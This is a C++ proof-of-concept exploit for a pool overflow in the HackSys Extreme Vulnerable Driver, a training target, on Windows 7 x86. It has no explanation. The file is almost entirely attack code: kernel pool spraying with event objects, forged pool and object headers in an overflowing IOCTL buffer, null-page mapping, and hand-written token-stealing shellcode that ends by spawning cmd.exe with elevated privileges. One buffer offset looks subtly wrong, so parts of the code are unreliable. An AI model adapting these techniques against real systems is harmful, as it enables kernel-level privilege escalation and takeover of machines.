// HEVD-PoolOverFlow-Win7-x86.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"

typedef NTSTATUS(__stdcall* pfNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect
);

int main()
{

	int allocSuccessCount = 0;
	HANDLE result = NULL;
	HANDLE resultArray[10000] = { 0 };
	for (int i = 0; i < 10000; i++) {
		result = CreateEventA(NULL, 0, 0, "");
		if (result != NULL) {
			allocSuccessCount += 1;
			resultArray[i] = result;
		}
	}

	allocSuccessCount = 0;
	HANDLE handleArray[5000] = { 0 };
	for (int i = 0; i < 5000; i++) {
		result = CreateEventA(NULL, 0, 0, "");
		if (result != NULL) {
			handleArray[i] = result;
			allocSuccessCount += 1;
		}
	}

	int freeCount = 0;
	for (int a = 0; a < 5000; a += 16) {
		for (int zzz = 0; zzz <= 7; zzz++) {
			if (CloseHandle(handleArray[a + zzz]) != NULL) {
				freeCount += 1;
				handleArray[a + zzz] = NULL;
			}
		}
	}

	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}

	byte PoolHeader[0x9] = "\x40\x00\x08\x04" 
		"\x45\x76\x65\xee"
		;


	byte objectHeaderQuotaInfo[0x11] = "\x00\x00\x00\x00" 
		"\x40\x00\x00\x00" 
		"\x00\x00\x00\x00" 
		"\x00\x00\x00\x00"
		;


	byte objectHeader[0x11] = "\x01\x00\x00\x00"
		"\x01\x00\x00\x00" 
		"\x00\x00\x00\x00" 
		"\x00" 
		"\x00"
		"\x08"
		"\x00"
		;

	DWORD bytesReturned = 0;
	byte inBuffer[0x220] = { 0 };
	memset(inBuffer, '\x41', 0x1F8);
	memcpy(inBuffer + 0x1F8, PoolHeader, 0x8); 
	memcpy(inBuffer + 0x1F8 + 8, objectHeaderQuotaInfo, 0x10); 
	memcpy(inBuffer + 0x1F8 + 10, objectHeader, 0x10); 

	char shellcode[67] = 
		"\x60"
		"\x64\xA1\x24\x01\x00\x00" 
		"\x8B\x40\x50" 
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00" 
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00" 
		"\x2D\xB8\x00\x00\x00" 
		"\x39\x90\xB4\x00\x00\x00" 
		"\x75\xED" 
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00" 
		"\x61" 
		"\xC2\x04\x00" 
		;
	LPVOID shellcodeAddress = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	LPVOID sourceAddress = &shellcodeAddress;

	int baseAddress = 1;
	int AllocationSize = 0x78;
	pfNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfNtAllocateVirtualMemory)GetProcAddress(
		GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	HANDLE allocNullResult = (HANDLE)NtAllocateVirtualMemory(
		GetCurrentProcess(),
		(PVOID *)&baseAddress,
		NULL,
		(PSIZE_T)&AllocationSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	if (allocNullResult == INVALID_HANDLE_VALUE) {
		return 1;
	}
	memset((LPVOID)0x0, 0, 0x78);
	memcpy((LPVOID)0x60, sourceAddress, 4);
	DeviceIoControl(
		dev,
		0x22200F,
		inBuffer,
		sizeof(inBuffer),
		NULL,
		0,
		&bytesReturned,
		(LPOVERLAPPED)NULL
	);

	for (int count = 0; count < 5000; count++) {
		CloseHandle(handleArray[count]);
	}

	system("cmd.exe");
	system("pause");
	CloseHandle(dev);
	return 0;
}


